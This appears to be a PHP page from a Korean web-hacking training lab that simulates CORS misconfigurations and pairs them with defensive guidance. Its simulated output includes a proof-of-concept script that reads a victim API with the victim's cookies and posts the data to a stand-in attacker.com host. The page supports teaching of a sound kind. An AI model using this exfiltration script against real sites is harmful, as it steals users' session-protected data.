<?php
/**
 * CORS Misconfiguration 취약점 테스트 페이지
 * 교육 목적으로만 사용하시기 바랍니다.
 */

session_start();
require_once '../db.php';
require_once '../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

$result = '';
$test_origin = '';
$cors_endpoint = '';

// CORS 설정 테스트
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['test_cors'])) {
        $test_origin = $_POST['origin'] ?? '';
        $cors_endpoint = $_POST['endpoint'] ?? 'api/data';
        
        // CORS 헤더 시뮬레이션
        $result = simulateCorsResponse($test_origin, $cors_endpoint);
    }
}

function simulateCorsResponse($origin, $endpoint) {
    $response = "[시뮬레이션] CORS 응답 헤더 분석\n";
    $response .= "요청 Origin: " . ($origin ?: '(없음)') . "\n";
    $response .= "API 엔드포인트: " . $endpoint . "\n\n";
    
    // 위험한 CORS 설정 패턴 검사
    $dangerous_patterns = [
        'null' => $origin === 'null',
        'wildcard' => $origin === '*',
        'reflected' => !empty($origin) && $origin !== '*',
        'subdomain' => strpos($origin, '.attacker.com') !== false,
        'protocol' => strpos($origin, 'file://') !== false || strpos($origin, 'data:') !== false
    ];
    
    $vulnerabilities = [];
    $cors_headers = [];
    
    // CORS 설정 시뮬레이션
    if (empty($origin)) {
        $response .= "CORS 헤더 응답:\n";
        $response .= "Access-Control-Allow-Origin: (설정되지 않음)\n";
        $response .= "상태: 안전함 (기본 Same-Origin Policy 적용)\n";
    } else {
        // 위험한 설정 시뮬레이션
        if ($dangerous_patterns['wildcard']) {
            $cors_headers['Access-Control-Allow-Origin'] = '*';
            $cors_headers['Access-Control-Allow-Credentials'] = 'true';
            $vulnerabilities[] = "치명적: 와일드카드(*)와 Credentials 동시 허용";
            
        } elseif ($dangerous_patterns['null']) {
            $cors_headers['Access-Control-Allow-Origin'] = 'null';
            $cors_headers['Access-Control-Allow-Credentials'] = 'true';
            $vulnerabilities[] = "위험: null origin 허용 (iframe sandbox 우회 가능)";
            
        } elseif ($dangerous_patterns['reflected']) {
            $cors_headers['Access-Control-Allow-Origin'] = $origin;
            $cors_headers['Access-Control-Allow-Credentials'] = 'true';
            $vulnerabilities[] = "위험: Origin 반사 (모든 도메인 허용)";
            
        } elseif ($dangerous_patterns['subdomain']) {
            $cors_headers['Access-Control-Allow-Origin'] = $origin;
            $cors_headers['Access-Control-Allow-Credentials'] = 'true';
            $vulnerabilities[] = "위험: 공격자 제어 서브도메인 허용";
            
        } elseif ($dangerous_patterns['protocol']) {
            $cors_headers['Access-Control-Allow-Origin'] = $origin;
            $vulnerabilities[] = "위험: file:// 또는 data: 프로토콜 허용";
            
        } else {
            // 일반적인 도메인
            if (in_array($origin, ['https://trusted-site.com', 'https://api.example.com'])) {
                $cors_headers['Access-Control-Allow-Origin'] = $origin;
                $cors_headers['Access-Control-Allow-Credentials'] = 'true';
                $response .= "안전한 CORS 설정 (화이트리스트 기반)\n";
            } else {
                $cors_headers['Access-Control-Allow-Origin'] = $origin;
                $cors_headers['Access-Control-Allow-Credentials'] = 'true';
                $vulnerabilities[] = "주의: 검증되지 않은 도메인 허용";
            }
        }
        
        // 추가 CORS 헤더 설정
        $cors_headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
        $cors_headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With';
        $cors_headers['Access-Control-Max-Age'] = '3600';
        
        $response .= "CORS 헤더 응답:\n";
        foreach ($cors_headers as $header => $value) {
            $response .= "{$header}: {$value}\n";
        }
    }
    
    if (!empty($vulnerabilities)) {
        $response .= "\n🚨 감지된 취약점:\n";
        foreach ($vulnerabilities as $vuln) {
            $response .= "- " . $vuln . "\n";
        }
        
        $response .= "\n공격 시나리오:\n";
        $response .= "1. 악의적 사이트에서 피해자 브라우저를 통해 API 호출\n";
        $response .= "2. 사용자 세션 쿠키가 자동으로 포함됨 (Credentials: true)\n";
        $response .= "3. 민감한 데이터 (개인정보, 토큰 등) 탈취 가능\n";
        $response .= "4. 사용자 권한으로 악의적 작업 수행 (데이터 변경, 삭제)\n";
        
        $response .= "\nPOC (Proof of Concept):\n";
        $response .= "<script>\n";
        $response .= "fetch('https://vulnerable-api.com/{$endpoint}', {\n";
        $response .= "    method: 'GET',\n";
        $response .= "    credentials: 'include'\n";
        $response .= "}).then(r => r.json()).then(data => {\n";
        $response .= "    // 탈취한 데이터를 공격자 서버로 전송\n";
        $response .= "    fetch('https://attacker.com/steal', {\n";
        $response .= "        method: 'POST',\n";
        $response .= "        body: JSON.stringify(data)\n";
        $response .= "    });\n";
        $response .= "});\n";
        $response .= "</script>";
    }
    
    return $response;
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Misconfiguration 테스트 - <?php echo SITE_NAME; ?></title>
    <link rel="stylesheet" href="../style.css">
    <style>
        .container {
            max-width: 1000px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .vulnerability-description, .mitigation-guide {
            background-color: #f9f9f9;
            border-left: 5px solid #f39c12;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .mitigation-guide {
            border-color: #28a745;
        }
        input[type="text"], input[type="url"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin: 5px 0;
        }
        .payload-btn {
            background: #17a2b8;
            color: white;
            border: none;
            padding: 8px 12px;
            margin: 5px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .payload-btn:hover {
            background: #138496;
        }
        .nav {
            background: #343a40;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .nav h1 {
            margin: 0;
            color: white;
        }
        .nav-links .btn {
            margin-left: 10px;
            background: #007bff;
            color: white;
            text-decoration: none;
            padding: 8px 15px;
            border-radius: 4px;
        }
        .cors-example {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }
        .vulnerability-card {
            background: #ffebee;
            border: 1px solid #ef5350;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }
        .test-section {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 네비게이션 바 -->
        <nav class="nav">
            <h1>CORS Misconfiguration 테스트</h1>
            <div class="nav-links">
                <span>환영합니다, <?php echo safe_output($_SESSION['username']); ?>님!</span>
                <a href="../index.php" class="btn">메인으로</a>
                <a href="index.php" class="btn">웹해킹 메뉴</a>
                <a href="../logout.php" class="btn">로그아웃</a>
            </div>
        </nav>

        <div class="vulnerability-description">
            <h2>🌐 CORS Misconfiguration 취약점</h2>
            <p><strong>설명:</strong> CORS (Cross-Origin Resource Sharing) 정책이 잘못 설정되어 있을 때 발생하는 취약점입니다. 
            악의적 웹사이트에서 사용자의 브라우저를 통해 다른 도메인의 API에 접근하여 민감한 데이터를 탈취하거나 조작할 수 있습니다.</p>
            
            <div class="cors-example">
                <h4>📖 CORS 작동 원리</h4>
                <p><strong>1. Preflight Request:</strong> OPTIONS 메소드로 사전 요청</p>
                <p><strong>2. 서버 응답:</strong> Access-Control-Allow-* 헤더로 허용 정책 전달</p>
                <p><strong>3. 실제 요청:</strong> 브라우저가 정책을 확인 후 실제 API 호출</p>
                <p><strong>4. 자격 증명:</strong> Credentials 포함 시 쿠키, 인증 헤더 전송</p>
            </div>
            
            <h3>📋 테스트 시나리오:</h3>
            <div style="margin: 10px 0;">
                <button onclick="testOrigin('*')" class="payload-btn">와일드카드(*)</button>
                <button onclick="testOrigin('null')" class="payload-btn">Null Origin</button>
                <button onclick="testOrigin('https://evil.com')" class="payload-btn">반사 공격</button>
                <button onclick="testOrigin('https://sub.attacker.com')" class="payload-btn">서브도메인</button>
                <button onclick="testOrigin('file://localhost')" class="payload-btn">File Protocol</button>
                <button onclick="testOrigin('https://trusted-site.com')" class="payload-btn">안전한 설정</button>
            </div>
        </div>

        <div class="test-section">
            <h3>🧪 CORS 설정 테스트</h3>
            <form method="POST">
                <label for="origin">🎯 테스트할 Origin:</label><br>
                <input type="text" id="origin" name="origin" value="<?php echo htmlspecialchars($test_origin); ?>" 
                       placeholder="예: https://evil-site.com 또는 * 또는 null"><br><br>
                
                <label for="endpoint">📡 API 엔드포인트:</label><br>
                <input type="text" id="endpoint" name="endpoint" value="<?php echo htmlspecialchars($cors_endpoint); ?>" 
                       placeholder="예: api/user/profile"><br><br>
                
                <input type="hidden" name="test_cors" value="1">
                <input type="submit" value="CORS 정책 테스트" class="btn">
            </form>
        </div>

        <?php if (!empty($result)): ?>
            <div style="margin-top: 20px;">
                <h2>📊 테스트 결과:</h2>
                <pre style="background: #f1f3f4; padding: 15px; border-radius: 5px; border-left: 4px solid #dc3545;"><?php echo htmlspecialchars($result); ?></pre>
            </div>
        <?php endif; ?>

        <div class="vulnerability-card">
            <h4>⚠️ 주요 CORS 취약점 패턴</h4>
            <p><strong>1. 와일드카드 남용:</strong> <code>Access-Control-Allow-Origin: *</code> + <code>Credentials: true</code></p>
            <p><strong>2. Origin 반사:</strong> 요청 Origin을 그대로 허용 헤더에 반사</p>
            <p><strong>3. Null Origin:</strong> <code>Access-Control-Allow-Origin: null</code> 허용</p>
            <p><strong>4. 서브도메인 검증 부족:</strong> <code>*.attacker.com</code> 등 공격자 도메인 허용</p>
            <p><strong>5. 프로토콜 검증 부족:</strong> <code>file://</code>, <code>data:</code> 등 허용</p>
        </div>

        <div class="test-section">
            <h3>💻 실시간 CORS 테스트</h3>
            <p>다음 JavaScript 코드로 실제 CORS 요청을 테스트할 수 있습니다:</p>
            <textarea readonly style="width: 100%; height: 200px; font-family: monospace; font-size: 12px;">
// CORS 테스트 함수
async function testCORS(targetUrl, withCredentials = false) {
    try {
        const response = await fetch(targetUrl, {
            method: 'GET',
            credentials: withCredentials ? 'include' : 'same-origin',
            headers: {
                'Content-Type': 'application/json',
                'X-Custom-Header': 'test'
            }
        });
        
        console.log('CORS 요청 성공:', response.status);
        console.log('응답 헤더:', [...response.headers.entries()]);
        
        const data = await response.text();
        console.log('응답 데이터:', data);
        
    } catch (error) {
        console.error('CORS 에러:', error);
        if (error.name === 'TypeError' && error.message.includes('CORS')) {
            console.log('CORS 정책에 의해 차단됨');
        }
    }
}

// 사용 예제
testCORS('https://api.example.com/data', true);
            </textarea>
        </div>

        <div class="mitigation-guide">
            <h2>🛡️ 방어 방법</h2>
            <ul>
                <li><strong>엄격한 Origin 화이트리스트:</strong> 신뢰할 수 있는 도메인만 명시적으로 허용</li>
                <li><strong>와일드카드 금지:</strong> <code>*</code>와 <code>credentials: true</code> 동시 사용 금지</li>
                <li><strong>Null Origin 거부:</strong> <code>null</code> origin 요청 차단</li>
                <li><strong>프로토콜 검증:</strong> HTTPS만 허용, file://, data: 프로토콜 차단</li>
                <li><strong>동적 Origin 검증:</strong> 정규식 기반 서브도메인 검증</li>
                <li><strong>Preflight 캐싱 제한:</strong> Max-Age를 적절히 설정</li>
                <li><strong>민감한 API 보호:</strong> 인증이 필요한 API는 추가 검증</li>
                <li><strong>모니터링:</strong> 비정상적인 Cross-Origin 요청 감지</li>
            </ul>
            
            <h4>🔧 안전한 CORS 설정 예제:</h4>
            <pre style="background: #e8f5e8; padding: 10px; border-radius: 4px; font-size: 12px;">
// PHP 예제
$allowed_origins = [
    'https://trusted-site.com',
    'https://app.example.com'
];

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if (in_array($origin, $allowed_origins)) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Credentials: true");
}
            </pre>
        </div>

        <div style="margin-top: 20px; text-align: center;">
            <a href="index.php" class="btn">← 웹해킹 테스트 메뉴로 돌아가기</a>
        </div>
    </div>

    <script>
        function testOrigin(origin) {
            if (confirm('⚠️ 교육 목적의 CORS 테스트를 실행하시겠습니까?\n\nOrigin: ' + origin)) {
                document.getElementById('origin').value = origin;
                document.getElementById('endpoint').value = 'api/user/data';
            }
        }

        // 위험 패턴 경고
        document.getElementById('origin').addEventListener('input', function() {
            const value = this.value.toLowerCase();
            const warningPatterns = ['*', 'null', 'file://', 'data:', '.attacker.', '.evil.'];
            
            let isRisky = warningPatterns.some(pattern => value.includes(pattern));
            
            if (isRisky) {
                this.style.borderColor = '#dc3545';
                this.style.backgroundColor = '#fff5f5';
            } else {
                this.style.borderColor = '#ddd';
                this.style.backgroundColor = 'white';
            }
        });

        // CORS 테스트 결과 시각화
        function visualizeCorsTest() {
            const origin = document.getElementById('origin').value;
            const endpoint = document.getElementById('endpoint').value;
            
            if (!origin) {
                alert('Origin을 입력해주세요.');
                return;
            }
            
            const testWindow = window.open('', '_blank', 'width=600,height=400');
            testWindow.document.write(`
                <html>
                <head><title>CORS Test Result</title></head>
                <body>
                    <h3>CORS 테스트 시뮬레이션</h3>
                    <p><strong>Origin:</strong> ${origin}</p>
                    <p><strong>Endpoint:</strong> ${endpoint}</p>
                    <div id="result">테스트 중...</div>
                    <script>
                        document.getElementById('result').innerHTML = 
                            '실제 환경에서는 브라우저 개발자 도구의 Network 탭에서 ' +
                            'CORS 헤더를 확인할 수 있습니다.<br><br>' +
                            'Console 탭에서 CORS 에러 메시지도 확인하세요.';
                    </script>
                </body>
                </html>
            `);
        }
    </script>
</body>
</html>